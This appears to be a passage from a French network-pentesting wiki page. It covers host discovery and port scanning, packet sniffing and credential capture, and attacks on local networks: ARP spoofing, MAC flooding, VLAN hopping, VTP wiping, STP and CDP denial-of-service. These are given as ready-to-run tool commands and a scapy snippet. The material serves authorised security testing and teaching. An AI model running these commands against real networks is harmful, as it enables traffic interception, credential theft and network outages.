# Pentesting Network

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce bug bounty** : **inscrivez-vous** sur **Intigriti**, une **plateforme de bug bounty premium cr√©√©e par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

## D√©couverte des h√¥tes de l'ext√©rieur

Ceci va √™tre une **br√®ve section** sur la fa√ßon de trouver des **IPs r√©pondant** depuis l'**Internet**.\
Dans cette situation, vous avez un **champ d'IPs** (peut-√™tre m√™me plusieurs **plages**) et vous devez juste trouver **quelles IPs r√©pondent**.

### ICMP

C'est la **m√©thode la plus facile** et **la plus rapide** pour d√©couvrir si un h√¥te est actif ou non.\
Vous pourriez essayer d'envoyer quelques **paquets ICMP** et **attendre des r√©ponses**. La fa√ßon la plus simple est d'envoyer une **demande d'√©cho** et d'attendre la r√©ponse. Vous pouvez le faire en utilisant un simple `ping` ou en utilisant `fping` pour des **plages**.\
Vous pourriez √©galement utiliser **nmap** pour envoyer d'autres types de paquets ICMP (cela √©vitera les filtres des demandes-r√©ponses d'√©cho ICMP courantes).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### D√©couverte de ports TCP

Il est tr√®s courant de constater que tous les types de paquets ICMP sont filtr√©s. Donc, tout ce que vous pouvez faire pour v√©rifier si un h√¥te est actif est **d'essayer de trouver des ports ouverts**. Chaque h√¥te a **65535 ports**, donc, si vous avez un "grand" p√©rim√®tre, vous **ne pouvez pas** tester si **chaque port** de chaque h√¥te est ouvert ou non, cela prendrait trop de temps.\
Ensuite, ce dont vous avez besoin est un **scanner de ports rapide** ([masscan](https://github.com/robertdavidgraham/masscan)) et une liste des **ports les plus utilis√©s :**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Vous pouvez √©galement effectuer cette √©tape avec `nmap`, mais c'est plus lent et `nmap` a des probl√®mes pour identifier les h√¥tes actifs.

### D√©couverte de port HTTP

Ceci est juste une d√©couverte de port TCP utile lorsque vous souhaitez **vous concentrer sur la d√©couverte des services HTTP** :
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### D√©couverte de port UDP

Vous pourriez √©galement essayer de v√©rifier certains **ports UDP ouverts** pour d√©cider si vous devriez **porter plus d'attention** √† un **h√¥te.** Comme les services UDP ne **r√©pondent g√©n√©ralement pas** avec **des donn√©es** √† un paquet de sonde UDP vide, il est difficile de dire si un port est filtr√© ou ouvert. La mani√®re la plus simple de d√©cider cela est d'envoyer un paquet li√© au service en cours d'ex√©cution, et comme vous ne savez pas quel service est en cours d'ex√©cution, vous devriez essayer le plus probable en fonction du num√©ro de port :
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La ligne nmap propos√©e pr√©c√©demment testera les **1000 ports UDP les plus courants** dans chaque h√¥te √† l'int√©rieur de la plage **/24**, mais m√™me cela prendra **>20min**. Si vous avez besoin de **r√©sultats plus rapides**, vous pouvez utiliser [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) : `./udp-proto-scanner.pl 199.66.11.53/24`. Cela enverra ces **probes UDP** √† leur **port attendu** (pour une plage /24, cela ne prendra qu'1 min) : _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### D√©couverte de port SCTP
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Ici, vous pouvez trouver un bon guide de toutes les attaques Wifi bien connues au moment de l'√©criture :

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## D√©couverte des h√¥tes de l'int√©rieur

Si vous √™tes √† l'int√©rieur du r√©seau, l'une des premi√®res choses que vous voudrez faire est de **d√©couvrir d'autres h√¥tes**. Selon **le niveau de bruit** que vous pouvez/voulez faire, diff√©rentes actions peuvent √™tre effectu√©es :

### Passif

Vous pouvez utiliser ces outils pour d√©couvrir passivement des h√¥tes √† l'int√©rieur d'un r√©seau connect√© :
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Actif

Notez que les techniques comment√©es dans [_**D√©couverte des h√¥tes de l'ext√©rieur**_](./#discovering-hosts-from-the-outside) (_D√©couverte de ports TCP/HTTP/UDP/SCTP_) peuvent √©galement √™tre **appliqu√©es ici**.\
Mais, comme vous √™tes sur le **m√™me r√©seau** que les autres h√¥tes, vous pouvez faire **plus de choses** :
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Notez que les techniques comment√©es dans _D√©couverte des h√¥tes de l'ext√©rieur_ ([_**ICMP**_](./#icmp)) peuvent √©galement √™tre **appliqu√©es ici**.\
Mais, comme vous √™tes sur le **m√™me r√©seau** que les autres h√¥tes, vous pouvez faire **plus de choses** :

* Si vous **pinguez** une **adresse de diffusion de sous-r√©seau**, le ping devrait arriver √† **chaque h√¥te** et ils pourraient **r√©pondre** √† **vous** : `ping -b 10.10.5.255`
* En pingant l'**adresse de diffusion du r√©seau**, vous pourriez m√™me trouver des h√¥tes √† l'int√©rieur de **d'autres sous-r√©seaux** : `ping -b 255.255.255.255`
* Utilisez les drapeaux `-PE`, `-PP`, `-PM` de `nmap` pour effectuer la d√©couverte d'h√¥tes en envoyant respectivement des **echo ICMPv4**, des **demandes de timestamp**, et des **demandes de masque de sous-r√©seau** : `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan est utilis√© pour **allumer** des ordinateurs via un **message r√©seau**. Le paquet magique utilis√© pour allumer l'ordinateur est simplement un paquet o√π un **MAC Dst** est fourni et ensuite il est **r√©p√©t√© 16 fois** √† l'int√©rieur du m√™me paquet.\
Ensuite, ce type de paquets est g√©n√©ralement envoy√© dans un **ethernet 0x0842** ou dans un **paquet UDP vers le port 9**.\
Si **aucun \[MAC]** n'est fourni, le paquet est envoy√© √† **la diffusion ethernet** (et le MAC de diffusion sera celui qui est r√©p√©t√©).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Scanning Hosts

Une fois que vous avez d√©couvert tous les IP (externes ou internes) que vous souhaitez scanner en profondeur, diff√©rentes actions peuvent √™tre effectu√©es.

### TCP

* **Port** ouvert : _SYN --> SYN/ACK --> RST_
* **Port** ferm√© : _SYN --> RST/ACK_
* **Port** filtr√© : _SYN --> \[AUCUNE R√âPONSE]_
* **Port** filtr√© : _SYN --> message ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Il y a 2 options pour scanner un port UDP :

* Envoyer un **paquet UDP** et v√©rifier la r√©ponse _**ICMP unreachable**_ si le port est **ferm√©** (dans plusieurs cas, ICMP sera **filtr√©** donc vous ne recevrez aucune information si le port est ferm√© ou ouvert).
* Envoyer des **datagrammes format√©s** pour susciter une r√©ponse d'un **service** (par exemple, DNS, DHCP, TFTP, et d'autres, comme list√© dans _nmap-payloads_). Si vous recevez une **r√©ponse**, alors, le port est **ouvert**.

**Nmap** va **m√©langer les deux** options en utilisant "-sV" (les scans UDP sont tr√®s lents), mais notez que les scans UDP sont plus lents que les scans TCP :
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** est con√ßu pour √™tre utilis√© aux c√¥t√©s de **TCP (Transmission Control Protocol)** et **UDP (User Datagram Protocol)**. Son principal objectif est de faciliter le transport des donn√©es de t√©l√©phonie sur les r√©seaux IP, refl√©tant de nombreuses fonctionnalit√©s de fiabilit√© que l'on trouve dans **Signaling System 7 (SS7)**. **SCTP** est un composant cl√© de la famille de protocoles **SIGTRAN**, qui vise √† transporter les signaux SS7 sur les r√©seaux IP.

Le support pour **SCTP** est fourni par divers syst√®mes d'exploitation, tels que **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, et **VxWorks**, indiquant son large acceptation et son utilit√© dans le domaine des t√©l√©communications et du r√©seautage.

Deux scans diff√©rents pour SCTP sont propos√©s par nmap : _-sY_ et _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### √âvasion des IDS et IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Plus d'options nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### R√©v√©ler les adresses IP internes

**Les routeurs, pare-feu et dispositifs r√©seau mal configur√©s** r√©pondent parfois aux sondes r√©seau en utilisant **des adresses source non publiques**. **tcpdump** peut √™tre utilis√© pour identifier les paquets re√ßus d'adresses priv√©es pendant les tests. Plus pr√©cis√©ment, sur Kali Linux, les paquets peuvent √™tre captur√©s sur l'**interface eth2**, qui est accessible depuis Internet public. Il est important de noter que si votre configuration est derri√®re un NAT ou un pare-feu, de tels paquets seront probablement filtr√©s.
```bash
tcpdump ‚Äìnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

En sniffing, vous pouvez apprendre des d√©tails sur les plages IP, les tailles de sous-r√©seau, les adresses MAC et les noms d'h√¥tes en examinant les trames et paquets captur√©s. Si le r√©seau est mal configur√© ou si le tissu de commutation est sous pression, les attaquants peuvent capturer des informations sensibles via le sniffing r√©seau passif.

Si un r√©seau Ethernet commut√© est configur√© correctement, vous ne verrez que des trames de diffusion et des mat√©riaux destin√©s √† votre adresse MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
On peut √©galement capturer des paquets d'une machine distante via une session SSH avec Wireshark comme interface graphique en temps r√©el.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

√âvidemment.

### Capturing credentials

Vous pouvez utiliser des outils comme [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) pour analyser les identifiants √† partir d'un pcap ou d'une interface en direct.

## LAN attacks

### ARP spoofing

L'ARP Spoofing consiste √† envoyer des ARPResponses gratuits pour indiquer que l'IP d'une machine a le MAC de notre appareil. Ensuite, la victime changera la table ARP et contactera notre machine chaque fois qu'elle voudra contacter l'IP usurp√©e.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - D√©bordement CAM

D√©bordez la table CAM du commutateur en envoyant beaucoup de paquets avec diff√©rentes adresses MAC source. Lorsque la table CAM est pleine, le commutateur commence √† se comporter comme un hub (diffusant tout le trafic).
```bash
macof -i <interface>
```
Dans les commutateurs modernes, cette vuln√©rabilit√© a √©t√© corrig√©e.

### 802.1Q VLAN / Attaques DTP

#### Trunking Dynamique

Le **Dynamic Trunking Protocol (DTP)** est con√ßu comme un protocole de couche liaison pour faciliter un syst√®me automatique de trunking, permettant aux commutateurs de s√©lectionner automatiquement les ports pour le mode trunk (Trunk) ou le mode non-trunk. Le d√©ploiement de **DTP** est souvent consid√©r√© comme indicatif d'une conception r√©seau sous-optimale, soulignant l'importance de configurer manuellement les trunks uniquement lorsque cela est n√©cessaire et d'assurer une documentation appropri√©e.

Par d√©faut, les ports des commutateurs sont configur√©s pour fonctionner en mode Auto Dynamique, ce qui signifie qu'ils sont pr√™ts √† initier le trunking si un commutateur voisin le demande. Un probl√®me de s√©curit√© survient lorsqu'un pentester ou un attaquant se connecte au commutateur et envoie une trame DTP D√©sirable, obligeant le port √† entrer en mode trunk. Cette action permet √† l'attaquant d'√©num√©rer les VLANs par l'analyse des trames STP et de contourner la segmentation VLAN en configurant des interfaces virtuelles.

La pr√©sence de DTP dans de nombreux commutateurs par d√©faut peut √™tre exploit√©e par des adversaires pour imiter le comportement d'un commutateur, acc√©dant ainsi au trafic √† travers tous les VLANs. Le script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) est utilis√© pour surveiller une interface, r√©v√©lant si un commutateur est en mode Par D√©faut, Trunk, Dynamique, Auto ou Acc√®s‚Äîce dernier √©tant la seule configuration immunis√©e contre les attaques de VLAN hopping. Cet outil √©value l'√©tat de vuln√©rabilit√© du commutateur.

Si une vuln√©rabilit√© r√©seau est identifi√©e, l'outil _**Yersinia**_ peut √™tre utilis√© pour "activer le trunking" via le protocole DTP, permettant l'observation des paquets de tous les VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

Pour √©num√©rer les VLANs, il est √©galement possible de g√©n√©rer le cadre DTP Desirable avec le script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. Ne pas interrompre le script sous aucun pr√©texte. Il injecte DTP Desirable toutes les trois secondes. **Les canaux de trunk cr√©√©s dynamiquement sur le switch ne vivent que cinq minutes. Apr√®s cinq minutes, le trunk tombe.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Je voudrais souligner que **Access/Desirable (0x03)** indique que le cadre DTP est de type D√©sirable, ce qui indique au port de passer en mode Trunk. Et **802.1Q/802.1Q (0xa5)** indique le type d'encapsulation **802.1Q**.

En analysant les cadres STP, **nous apprenons l'existence de VLAN 30 et VLAN 60.**

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### Attaquer des VLANs sp√©cifiques

Une fois que vous connaissez les valeurs des ID de VLAN et des IP, vous pouvez **configurer une interface virtuelle pour attaquer un VLAN sp√©cifique**.\
Si DHCP n'est pas disponible, utilisez _ifconfig_ pour d√©finir une adresse IP statique.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

L'attaque discut√©e de **Dynamic Trunking et cr√©ation d'interfaces virtuelles pour d√©couvrir des h√¥tes √† l'int√©rieur** d'autres VLANs est **automatiquement effectu√©e** par l'outil : [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Si un attaquant conna√Æt la valeur du **MAC, IP et VLAN ID de l'h√¥te victime**, il pourrait essayer de **double taguer une trame** avec son VLAN d√©sign√© et le VLAN de la victime et envoyer un paquet. Comme la **victime ne pourra pas se connecter** avec l'attaquant, la **meilleure option pour l'attaquant est de communiquer via UDP** √† des protocoles qui peuvent effectuer des actions int√©ressantes (comme SNMP).

Une autre option pour l'attaquant est de lancer un **scan de port TCP en usurpant une IP contr√¥l√©e par l'attaquant et accessible par la victime** (probablement via internet). Ensuite, l'attaquant pourrait sniffer dans le deuxi√®me h√¥te qui lui appartient s'il re√ßoit des paquets de la victime.

![](<../../.gitbook/assets/image (190).png>)

Pour effectuer cette attaque, vous pourriez utiliser scapy : `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Contournement de la segmentation VLAN lat√©rale <a href="#d679" id="d679"></a>

Si vous avez **acc√®s √† un switch auquel vous √™tes directement connect√©**, vous avez la possibilit√© de **contourner la segmentation VLAN** au sein du r√©seau. Il suffit de **changer le port en mode trunk** (√©galement connu sous le nom de trunk), de cr√©er des interfaces virtuelles avec les ID des VLAN cibles, et de configurer une adresse IP. Vous pouvez essayer de demander l'adresse de mani√®re dynamique (DHCP) ou vous pouvez la configurer statiquement. Cela d√©pend du cas.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Contournement de VLAN priv√© de couche 3

Dans certains environnements, tels que les r√©seaux sans fil pour invit√©s, des param√®tres **d'isolation de port (√©galement connus sous le nom de VLAN priv√©)** sont mis en ≈ìuvre pour emp√™cher les clients connect√©s √† un point d'acc√®s sans fil de communiquer directement entre eux. Cependant, une technique a √©t√© identifi√©e qui peut contourner ces mesures d'isolation. Cette technique exploite soit l'absence de ACL r√©seau, soit leur configuration incorrecte, permettant aux paquets IP d'√™tre rout√©s via un routeur pour atteindre un autre client sur le m√™me r√©seau.

L'attaque est ex√©cut√©e en cr√©ant un **paquet qui porte l'adresse IP du client de destination mais avec l'adresse MAC du routeur**. Cela am√®ne le routeur √† transmettre par erreur le paquet au client cible. Cette approche est similaire √† celle utilis√©e dans les attaques de Double Tagging, o√π la capacit√© de contr√¥ler un h√¥te accessible √† la victime est utilis√©e pour exploiter la faille de s√©curit√©.

**√âtapes cl√©s de l'attaque :**

1. **Cr√©ation d'un paquet :** Un paquet est sp√©cialement con√ßu pour inclure l'adresse IP du client cible mais avec l'adresse MAC du routeur.
2. **Exploitation du comportement du routeur :** Le paquet con√ßu est envoy√© au routeur, qui, en raison de la configuration, redirige le paquet vers le client cible, contournant l'isolation fournie par les param√®tres de VLAN priv√©.

### Attaques VTP

VTP (VLAN Trunking Protocol) centralise la gestion des VLAN. Il utilise des num√©ros de r√©vision pour maintenir l'int√©grit√© de la base de donn√©es VLAN ; toute modification incr√©mente ce num√©ro. Les switches adoptent des configurations avec des num√©ros de r√©vision plus √©lev√©s, mettant √† jour leurs propres bases de donn√©es VLAN.

#### R√¥les du domaine VTP

* **Serveur VTP :** G√®re les VLAN‚Äîcr√©e, supprime, modifie. Il diffuse des annonces VTP aux membres du domaine.
* **Client VTP :** Re√ßoit des annonces VTP pour synchroniser sa base de donn√©es VLAN. Ce r√¥le est restreint des modifications de configuration VLAN locales.
* **Transparent VTP :** Ne participe pas aux mises √† jour VTP mais transmet les annonces VTP. Non affect√© par les attaques VTP, il maintient un num√©ro de r√©vision constant de z√©ro.

#### Types d'annonces VTP

* **Annonce de r√©sum√© :** Diffus√©e par le serveur VTP toutes les 300 secondes, portant des informations essentielles sur le domaine.
* **Annonce de sous-ensemble :** Envoy√©e suite √† des modifications de configuration VLAN.
* **Demande d'annonce :** √âmise par un client VTP pour demander une annonce de r√©sum√©, g√©n√©ralement en r√©ponse √† la d√©tection d'un num√©ro de r√©vision de configuration plus √©lev√©.

Les vuln√©rabilit√©s VTP sont exploitables exclusivement via des ports trunk, car les annonces VTP circulent uniquement par eux. Les sc√©narios post-attaque DTP pourraient pivoter vers VTP. Des outils comme Yersinia peuvent faciliter les attaques VTP, visant √† effacer la base de donn√©es VLAN, perturbant ainsi le r√©seau.

Note : Cette discussion concerne la version 1 de VTP (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
Dans le mode graphique de Yersinia, choisissez l'option de suppression de tous les vlans VTP pour purger la base de donn√©es VLAN.

### Attaques STP

**Si vous ne pouvez pas capturer les trames BPDU sur vos interfaces, il est peu probable que vous r√©ussissiez dans une attaque STP.**

#### **DoS BPDU STP**

En envoyant beaucoup de BPDUs TCP (Notification de changement de topologie) ou Conf (les BPDUs qui sont envoy√©s lorsque la topologie est cr√©√©e), les commutateurs sont surcharg√©s et cessent de fonctionner correctement.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Attaque STP TCP**

Lorsqu'un TCP est envoy√©, la table CAM des commutateurs sera supprim√©e en 15s. Ensuite, si vous envoyez continuellement ce type de paquets, la table CAM sera red√©marr√©e en continu (ou toutes les 15 secondes) et lorsqu'elle est red√©marr√©e, le commutateur se comporte comme un hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Attaque de racine STP**

L'attaquant simule le comportement d'un commutateur pour devenir la racine STP du r√©seau. Ensuite, plus de donn√©es passeront par lui. Cela est int√©ressant lorsque vous √™tes connect√© √† deux commutateurs diff√©rents.\
Cela se fait en envoyant des paquets BPDUs CONF disant que la valeur de **priorit√©** est inf√©rieure √† la priorit√© r√©elle du commutateur racine actuel.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si l'attaquant est connect√© √† 2 commutateurs, il peut √™tre la racine du nouvel arbre et tout le trafic entre ces commutateurs passera par lui** (une attaque MITM sera effectu√©e).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Attaques CDP

Le protocole de d√©couverte CISCO (CDP) est essentiel pour la communication entre les appareils CISCO, leur permettant de **s'identifier mutuellement et de partager des d√©tails de configuration**.

#### Collecte de donn√©es passive <a href="#id-0e0f" id="id-0e0f"></a>

CDP est configur√© pour diffuser des informations √† travers tous les ports, ce qui pourrait entra√Æner un risque de s√©curit√©. Un attaquant, en se connectant √† un port de commutateur, pourrait d√©ployer des analyseurs de r√©seau comme **Wireshark**, **tcpdump** ou **Yersinia**. Cette action peut r√©v√©ler des donn√©es sensibles sur l'appareil r√©seau, y compris son mod√®le et la version de Cisco IOS qu'il ex√©cute. L'attaquant pourrait alors cibler des vuln√©rabilit√©s sp√©cifiques dans la version de Cisco IOS identifi√©e.

#### Induction d'un d√©bordement de table CDP <a href="#id-0d6a" id="id-0d6a"></a>

Une approche plus agressive consiste √† lancer une attaque par d√©ni de service (DoS) en submergeant la m√©moire du commutateur, en pr√©tendant √™tre des appareils CISCO l√©gitimes. Ci-dessous se trouve la s√©quence de commandes pour initier une telle attaque en utilisant Yersinia, un outil r√©seau con√ßu pour les tests :
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Pendant cette attaque, le CPU du commutateur et la table des voisins CDP sont fortement sollicit√©s, ce qui entra√Æne ce que l'on appelle souvent **‚Äúparalysie du r√©seau‚Äù** en raison de la consommation excessive de ressources.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Vous pouvez √©galement utiliser [**scapy**](https://github.com/secdev/scapy/). Assurez-vous de l'installer avec le package `scapy/contrib`.

### Attaques VoIP et l'outil VoIP Hopper

Les t√©l√©phones VoIP, de plus en plus int√©gr√©s aux appareils IoT, offrent des fonctionnalit√©s telles que d√©verrouiller des portes ou contr√¥ler des thermostats via des num√©ros de t√©l√©phone sp√©ciaux. Cependant, cette int√©gration peut poser des risques de s√©curit√©.

L'outil [**voiphopper**](http://voiphopper.sourceforge.net) est con√ßu pour √©muler un t√©l√©phone VoIP dans divers environnements (Cisco, Avaya, Nortel, Alcatel-Lucent). Il d√©couvre l'ID VLAN du r√©seau vocal en utilisant des protocoles comme CDP, DHCP, LLDP-MED et 802.1Q ARP.

**VoIP Hopper** propose trois modes pour le protocole de d√©couverte Cisco (CDP) :

1. **Mode Sniff** (`-c 0`) : Analyse les paquets r√©seau pour identifier l'ID VLAN.
2. **Mode Spoof** (`-c 1`) : G√©n√®re des paquets personnalis√©s imitant ceux d'un v√©ritable appareil VoIP.
3. **Mode Spoof avec Paquet Pr√©-fabriqu√©** (`-c 2`) : Envoie des paquets identiques √† ceux d'un mod√®le sp√©cifique de t√©l√©phone IP Cisco.

Le mode pr√©f√©r√© pour la vitesse est le troisi√®me. Il n√©cessite de sp√©cifier :

* L'interface r√©seau de l'attaquant (`-i` param√®tre).
* Le nom de l'appareil VoIP √©tant √©mul√© (`-E` param√®tre), en respectant le format de nommage Cisco (par exemple, SEP suivi d'une adresse MAC).

Dans les environnements d'entreprise, pour imiter un appareil VoIP existant, on peut :

* Inspecter l'√©tiquette MAC sur le t√©l√©phone.
